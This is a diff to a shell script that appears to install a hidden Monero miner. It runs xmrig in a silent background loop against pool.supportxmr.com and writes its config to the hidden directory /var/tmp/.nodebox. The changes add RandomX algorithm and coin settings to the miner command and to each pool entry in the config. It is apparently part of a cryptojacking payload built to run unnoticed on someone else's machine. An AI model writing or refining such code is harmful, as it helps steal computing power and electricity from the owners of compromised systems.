@@ -210,7 +210,7 @@ if (test $? -ne 0); then
         PASS="root"
         echo "[*] Starting xmrig with auto-restart loop"
         (while true; do
-          xmrig -o pool.supportxmr.com:3333 -o pool.supportxmr.com:443 -o pool.supportxmr.com:8080 -o pool.supportxmr.com:7777 -o pool.supportxmr.com:5555 -o pool.supportxmr.com:80 -u $WALLET -p $PASS -k --donate-level 0 --coin monero >/dev/null 2>&1
+          xmrig -o pool.supportxmr.com:3333 -o pool.supportxmr.com:443 -o pool.supportxmr.com:8080 -o pool.supportxmr.com:7777 -o pool.supportxmr.com:5555 -o pool.supportxmr.com:80 -u $WALLET -p $PASS -k --donate-level 0 --coin monero -a rx/0 >/dev/null 2>&1
           sleep 5
         done) &
         echo "[*] xmrig started in background with auto-restart"
@@ -237,6 +237,8 @@ cat >/var/tmp/.nodebox/config.json <<EOL
     "cuda": false,
     "pools": [
         {
+            "algo": "rx/0",
+            "coin": "monero",
             "url": "pool.supportxmr.com:443",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -244,6 +246,8 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": true
         },
         {
+            "algo": "rx/0",
+            "coin": "monero",
             "url": "pool.supportxmr.com:8080",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -251,6 +255,8 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
+            "algo": "rx/0",
+            "coin": "monero",
             "url": "pool.supportxmr.com:7777",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -258,6 +264,8 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
+            "algo": "rx/0",
+            "coin": "monero",
             "url": "pool.supportxmr.com:5555",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -265,6 +273,8 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
+            "algo": "rx/0",
+            "coin": "monero",
             "url": "pool.supportxmr.com:80",
             "user": "$WALLET",
             "pass": "$PASS",
@@ -272,6 +282,8 @@ cat >/var/tmp/.nodebox/config.json <<EOL
             "tls": false
         },
         {
+            "algo": "rx/0",
+            "coin": "monero",
             "url": "pool.supportxmr.com:3333",
             "user": "$WALLET",
             "pass": "$PASS",
